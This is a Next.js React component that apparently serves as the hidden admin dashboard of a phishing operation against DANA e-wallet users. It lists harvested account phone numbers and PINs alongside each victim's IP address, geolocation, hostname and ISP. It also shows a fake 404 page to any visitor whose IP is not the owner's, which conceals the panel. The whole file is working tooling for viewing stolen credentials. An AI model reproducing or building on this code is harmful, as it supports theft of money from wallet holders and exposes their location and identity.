'use client'

import { useState, useEffect } from 'react'

const SuperAdmin = () => {
   const [lists, setList] = useState([])
   const [error, setError] = useState(false)
   const [load, setLoad] = useState(true)
   const [owner, setOwner] = useState('')
   const [ownLoad, setOwnLoad]= useState(true)

   useEffect(() => {
      const getAccountList = async() => {
         try {
            const res = await fetch('http://localhost:3000/api/hehe', { 
              cache: 'no-store',
              headers: {
                'Authorization': process.env.NEXT_PUBLIC_AUTH
              }
            })

            if(!res.ok)
                throw new Error('Failed fetch list')

            const data = await res.json()
            
            if(!data || !data.DanaList) setError(true)
           
            setLoad(false)      
            setList(data.DanaList)
         } catch(err) {
            console.log('[X] Error get: ' + err)
         }
      }
     getAccountList()

    const get_ip = async() => {
      try {
         const res = await fetch("https://ipinfo.io/json", { cache: 'no-store' })
         const data = await res.json()

         if(!res.ok) {
            throw new Error('Failed fetching data')
         }

         if(!data)
            throw new Error('Data null')

         setOwner(data.ip)
 
         if(process.env.NEXT_PUBLIC_OWNER === data.ip)
            setOwnLoad(false)

      } catch(err) {
         console.error(`\n[X] Error cuy: ${err}\n`)
      }
   }

   get_ip()
   }, [])

   if (ownLoad) {
     return <div className="min-h-screen flex justify-center items-center w-full text-center font-bold text-2xl text-white"><span>404 Not found...</span></div>
   }

   if(!ownLoad && process.env.NEXT_PUBLIC_OWNER === owner) {
     let ownerName = ''

     if(process.env.NEXT_PUBLIC_OWNER === owner) {
         ownerName = "Jafar"
     } else {
         ownerName = "Pahmi pacar copi yang"
     }

     return (
       <div className="min-h-screen bg-slate-900">
          <div className="pt-20 flex justify-center">
           <div className="flex-col px-4 mx-auto w-full">
            <h1 className="mb-20 text-center text-gray-200 text-2xl">Hai <span className="font-bold">{ownerName && ownerName}</span> ku sayang</h1>
             <h2 className="text-gray-200 text-start font-semibold text-xl mb-5">List cuan:</h2>
            {load && <div className="text-center text-white">Loading bang sabar yak...</div>}
            {error ? (
                <div className="bg-slate-900 py-3 px-4 rounded-md">Data tidak ditemukan</div>
              ) : (
             <div className="grid grid-cols-1 md:grid-cols-5 gap-y-2 md:gap-x-3">
               {lists.map((i, index) => (
                 <div key={index} className="bg-slate-800 py-4 px-5 rounded-md">
                    <p className="text-gray-100 font-medium text-lg">Nomor Dana: <span className="text-green-400">{i.nomor_dana}</span></p>
                    <p className="text-gray-100 font-medium text-lg">Pin Dana: <span className="text-green-400">{i.pin_dana.replace(/,/g, '')}</span></p>
                    <p className="mt-4 text-gray-200 font-semibold">Infomasi tentang user:</p>
                  {i.user_info.map((u, index) => (
                   <div key={index}>
                    <p className="text-gray-100 text-xs">Ip Address: <span className="text-red-300">{u.ip_address}</span></p>
                    <p className="text-gray-100 text-xs">Kota: <span className="text-red-300">{u.city}</span></p>
                    <p className="text-gray-100 text-xs">Negara: <span className="text-red-300">{u.country}</span></p>
                    <p className="text-gray-100 text-xs">Kode lokasi: <span className="text-red-300">{u.loc}</span></p>
                    <p className="text-gray-100 text-xs">Hostname: <span className="text-red-300">{u.hostname}</span></p>
                    <p className="text-gray-100 text-xs">Jaringan: <span className="text-red-300">{u.org}</span></p>
                    <p className="text-gray-100 text-xs">Zona Waktu: <span className="text-red-300">{u.timezone}</span></p>
                    </div>
                   ))}
                 </div>
                ))}
               </div>
              )}
             </div>
           </div>
       </div>  
     )
  }
} 

export default SuperAdmin
